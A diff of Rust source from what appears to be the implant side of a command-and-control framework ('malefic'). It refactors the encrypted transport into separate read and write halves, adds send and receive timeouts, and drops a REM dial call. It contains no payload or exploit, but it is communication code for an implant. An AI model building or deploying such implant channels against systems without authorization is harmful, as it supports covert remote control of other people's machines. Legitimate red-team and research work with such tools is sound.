@@ -11,27 +11,16 @@ pub mod proxie;
 use anyhow::Result;
 use async_trait::async_trait;
 use futures::lock::Mutex;
-use futures::{join, AsyncRead, AsyncWrite, FutureExt};
+use futures::{join, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt, FutureExt};
 use futures_timer::Delay;
 use malefic_helper::debug;
 use malefic_proto::crypto::{Cryptor, CryptorError};
 use malefic_proto::{parser_header, SpiteData, HEADER_LEN};
 use std::io;
+use std::pin::Pin;
 use std::sync::Arc;
 use std::time::Duration;
 use thiserror::Error;
-
-#[async_trait]
-pub trait ListenerExt: Sized {
-    async fn bind(addr: &str) -> anyhow::Result<Self>;
-    async fn accept(&mut self) -> anyhow::Result<impl TransportTrait>;
-}
-
-#[async_trait]
-pub trait DialerExt {
-    async fn connect(&mut self, addr: &str) -> anyhow::Result<impl TransportTrait>;
-}
-
 
 cfg_if::cfg_if! {
     if #[cfg(feature = "transport_tcp")] {
@@ -47,6 +36,25 @@ cfg_if::cfg_if! {
         compile_error!("No transport selected");
     }
 }
+
+#[async_trait]
+pub trait TransportImpl: AsyncRead + AsyncWrite + Unpin + Send  {}
+
+impl<T> TransportImpl for T where T: AsyncRead + AsyncWrite + Unpin + Send  {}
+
+
+#[async_trait]
+pub trait ListenerExt: Sized {
+    async fn bind(addr: &str) -> anyhow::Result<Self>;
+    async fn accept(&mut self) -> anyhow::Result<impl TransportImpl>;
+}
+
+#[async_trait]
+pub trait DialerExt {
+    async fn connect(&mut self, addr: &str) -> anyhow::Result<impl TransportImpl>;
+}
+
+
 
 #[cfg(feature = "bind")]
 cfg_if::cfg_if! {
@@ -74,6 +82,9 @@ pub enum TransportError {
     #[error("Failed to send data within the timeout")]
     SendTimeout,
 
+    #[error("Deadline")]
+    Deadline,
+
     #[error("Failed to receive data")]
     RecvError,
 
@@ -90,28 +101,44 @@ pub enum TransportError {
     UnknownError,
 }
 
-#[async_trait]
-pub trait TransportTrait: AsyncRead + AsyncWrite + Send + Sync {
-    async fn recv(&mut self, len: usize) -> Result<Vec<u8>>;
-    async fn send(&mut self, data: Vec<u8>) -> Result<usize>;
-    async fn done(&mut self) -> Result<()>;
-    async fn close(&mut self) -> Result<bool>;
-}
-
-#[derive(Clone)]
 pub struct Transport {
-    pub innter: InnterTransport,
+    pub inner: InnterTransport,
     pub write_lock: Arc<Mutex<bool>>,
     pub read_lock: Arc<Mutex<bool>>,
+}
+
+// 传输层读取半部
+pub struct TransportReadHalf {
+    reader: Pin<Box<dyn AsyncRead + Send + Sync>>,
+    read_lock: Arc<Mutex<bool>>,
+}
+
+// 传输层写入半部
+pub struct TransportWriteHalf {
+    writer: Pin<Box<dyn AsyncWrite + Send + Sync>>,
+    write_lock: Arc<Mutex<bool>>,
 }
 
 impl Transport {
     pub fn new(transport: InnterTransport) -> Self {
         Transport {
-            innter: transport,
+            inner: transport,
             write_lock: Arc::new(Mutex::new(false)),
             read_lock: Arc::new(Mutex::new(false)),
         }
+    }
+
+    pub fn split(self) -> (TransportReadHalf, TransportWriteHalf) {
+        let (reader, writer) = self.inner.split();
+        let read_half = TransportReadHalf {
+            reader: Box::pin(reader),
+            read_lock: self.read_lock.clone(),
+        };
+        let write_half = TransportWriteHalf {
+            writer: Box::pin(writer),
+            write_lock: self.write_lock,
+        };
+        (read_half, write_half)
     }
 
     pub async fn write_wait(&self) -> Result<(), ()> {
@@ -145,26 +172,64 @@ impl Transport {
         let mut lock = self.read_lock.lock().await;
         *lock = true;
     }
+}
 
-    pub async fn recv(&mut self, len: usize) -> Result<Vec<u8>> {
-        let data = self.innter.recv(len).await?;
-        Ok(data)
+impl TransportReadHalf {
+    async fn read_over(&self) {
+        let mut lock = self.read_lock.lock().await;
+        *lock = true;
     }
 
-    pub async fn send(&mut self, data: Vec<u8>) -> Result<usize> {
-        let n = self.innter.send(data).await?;
-        Ok(n)
-    }
-    
-    pub async fn done(&mut self) -> Result<()> {
-        let res = self.innter.done().await?;
-        Ok(res)
-    }
-    pub async fn close(&mut self) -> Result<bool> {
-        let res = self.innter.close().await?;
-        Ok(res)
+    pub async fn read(&mut self, len: usize) -> Result<Vec<u8>> {
+        let mut result = vec![0u8; len];
+        let mut total_read = 0;
+
+        while total_read < len {
+            let remaining = len - total_read;
+            let chunk_size = remaining.min(8192);
+
+            let n = self.reader.read(&mut result[total_read..total_read + chunk_size]).await?;
+            if n == 0 {
+                // 连接关闭或没有更多数据
+                break;
+            }
+            total_read += n;
+        }
+
+        result.truncate(total_read);
+        Ok(result)
     }
 }
+
+impl TransportWriteHalf {
+    async fn write_wait(&self) -> Result<(), ()> {
+        loop {
+            let lock_guard = self.write_lock.lock().await;
+            if *lock_guard {
+                return Ok(());
+            }
+            drop(lock_guard);
+            Delay::new(Duration::from_millis(10)).await;
+        }
+    }
+
+    async fn write_over(&self) {
+        let mut lock = self.write_lock.lock().await;
+        *lock = true;
+    }
+
+    pub async fn write(&mut self, data: &[u8]) -> Result<usize> {
+        self.writer.write_all(data).await?;
+        Ok(data.len())
+    }
+
+    pub async fn flush(&mut self) -> Result<()> {
+        self.writer.flush().await?;
+        Ok(())
+    }
+}
+
+
 
 #[derive(Clone)]
 pub struct Stream {
@@ -172,20 +237,20 @@ pub struct Stream {
 }
 
 impl Stream {
-    pub async fn send(&mut self, mut transport: Transport, data: Vec<u8>) -> Result<usize> {
-        let data = self.cryptor.encrypt(data)?;
-        transport.send(data).await
+    pub async fn write(&mut self, writer: &mut TransportWriteHalf, data: &[u8]) -> Result<usize> {
+        let encrypted_data = self.cryptor.encrypt(data.to_vec())?;
+        writer.write(&encrypted_data).await
     }
 
-    pub async fn recv(&mut self, mut transport: Transport, len: usize) -> Result<Vec<u8>> {
-        let data = transport.recv(len).await?;
-        debug!("[transport] recv expect:{} {}", len, data.len());
+    pub async fn read(&mut self, reader: &mut TransportReadHalf, len: usize) -> Result<Vec<u8>> {
+        let data = reader.read(len).await?;
+        debug!("[stream] read expect:{} actual:{}", len, data.len());
         if data.len() != len {
             return Err(TransportError::RecvError.into());
         }
         Ok(self.cryptor.decrypt(data)?)
     }
-    
+
     pub fn reset(&mut self) {
         self.cryptor.reset();
     }
@@ -194,96 +259,108 @@ impl Stream {
 
 
 impl Client {
-    pub fn new(cryptor: Cryptor) -> Self {
-        #[cfg(feature = "transport_rem")]
-        {
-            let _ = malefic_helper::common::rem::rem_dial(&crate::config::REM).map_err(|e| {
-                debug!("[transport] REM dial error: {}", e);
-                TransportError::ConnectionError
-            });
-        }
-        Client {
-            stream: Stream { cryptor },
-        }
-    }
+
     pub async fn handler(
         &mut self,
-        mut transport: Transport,
+        transport: InnterTransport,
         data: SpiteData,
     ) -> Result<Option<SpiteData>> {
         self.stream.cryptor.reset();
 
         let mut sender = self.clone();
         let mut receiver = self.clone();
-        let send_task = sender.send(transport.clone(), data).fuse();
-        let recv_task = receiver.recv(transport.clone()).fuse();
-        let (recv_result, send_result) = join!(recv_task, send_task);
 
-        let _ = transport.close().await?;
+        let (mut reader, mut writer) = Transport::new(transport).split();
+        
+        futures::select! {
+            result = async {
+                let send_task = sender.send(&mut writer, data).fuse();
+                let recv_task = receiver.recv(&mut reader).fuse();
+                let (recv_result, send_result) = join!(recv_task, send_task);
 
-        if let Err(e) = send_result {
-            debug!("[client] send error: {:?}", e);
-            return Err(e.into());
-        }
+                // 关闭连接
+                let _ = writer.writer.close().await;
 
-        match recv_result {
-            Ok(data) => Ok(Some(data)),
-            Err(e) => {
-                debug!("[client] recv error: {:?}", e);
-                Ok(None)
+                if let Err(e) = send_result {
+                    debug!("[client] send error: {:?}", e);
+                    return Err(e.into());
+                }
+
+                match recv_result {
+                    Ok(data) => Ok(Some(data)),
+                    Err(e) => {
+                        debug!("[client] recv error: {:?}", e);
+                        Ok(None)
+                    }
+                }
+            }.fuse() => result,
+            _ = Delay::new(Duration::from_secs(10)).fuse() => {
+                debug!("[client] handler timeout after 10 seconds");
+                // 尝试关闭连接
+                let _ = writer.writer.close().await;
+                Err(TransportError::Deadline.into())
             }
         }
     }
 
-    pub async fn send(&mut self, mut transport: Transport, data: SpiteData) -> Result<()> {
-        let n = self.stream.send(transport.clone(), data.header()).await?;
-        if n == data.header().len() {
-            debug!("[transport] send header success");
-        } else {
-            return Err(TransportError::SendError.into());
-        }
+    pub async fn send(&mut self, writer: &mut TransportWriteHalf, data: SpiteData) -> Result<()> {
+        futures::select! {
+            result = async {
+                let header = data.header();
+                let n = self.stream.write(writer, &header).await?;
+                if n != header.len() {
+                    return Err(TransportError::SendError.into());
+                }
+                debug!("[transport] send header success");
 
-        let body = data.body();
-        let n = self.stream.send(transport.clone(), body.clone()).await?;
-        if n == body.len() {
-            transport.done().await?;
-            transport.write_over().await;
-            debug!("[transport] send over");
-            transport.read_wait().await.ok();
-        } else {
-            return Err(TransportError::SendError.into());
+                let body = data.body();
+                let n = self.stream.write(writer, &body).await?;
+                if n != body.len() {
+                    return Err(TransportError::SendError.into());
+                }
+                debug!("[transport] send body success");
+                writer.flush().await?;
+                writer.write_over().await;
+                debug!("[transport] send over");
+                writer.write_wait().await.ok();
+                Ok(())
+            }.fuse() => result,
+            _ = Delay::new(Duration::from_secs(2)).fuse() => {
+                Err(TransportError::SendTimeout.into())
+            }
         }
-
-        Ok(())
     }
 
-    pub async fn recv(&mut self, transport: Transport) -> Result<SpiteData> {
+    pub async fn recv(&mut self, reader: &mut TransportReadHalf) -> Result<SpiteData> {
         futures::select! {
-            res = self.stream.recv(transport.clone(), HEADER_LEN).fuse() => {
+            res = async {
+                // 接收header
+                let response_data = self.stream.read(reader, HEADER_LEN).await?;
+                if response_data.len() != HEADER_LEN {
+                    return Err(TransportError::RecvError.into());
+                }
+
+                let mut spitedata = parser_header(&response_data)?;
+                debug!("[client] recv header success: {:?}, length: {}", response_data, spitedata.length);
+
+                // 接收body
+                let data = self.stream.read(reader, spitedata.length as usize + 1).await?;
+                spitedata.set_data(data)?;
+                reader.read_over().await;
+                debug!("[client] recv over");
+                Ok(spitedata)
+            }.fuse() => {
                 match res {
-                    Ok(response_data) if response_data.len() == HEADER_LEN => {
-                        let mut spitedata = parser_header(&response_data)?;
-                        debug!("[client] recv header success: {:?}, {}", response_data, spitedata.length);
-                        let data = self.stream.recv(transport.clone(), spitedata.length as usize + 1).await?;
-                        spitedata.set_data(data)?;
-                        transport.read_over().await;
-                        debug!("[client] recv over");
-                        Ok(spitedata)
-                    }
-                    Ok(_) => {
-                        debug!("[client] recv: {:?}", res);
-                        transport.read_over().await;
-                        Err(TransportError::RecvError.into())
-                    }
+                    Ok(data) => Ok(data),
                     Err(e) => {
-                        transport.read_over().await;
+                        reader.read_over().await;
                         Err(e)
                     }
                 }
             },
-            _ = transport.write_wait().fuse() => {
-                transport.read_over().await;
-                Err(TransportError::SendTimeout.into())
+            _ = Delay::new(Duration::from_secs(2)).fuse() => {
+                reader.read_over().await;
+                Err(TransportError::RecvError.into())
             }
         }
     }
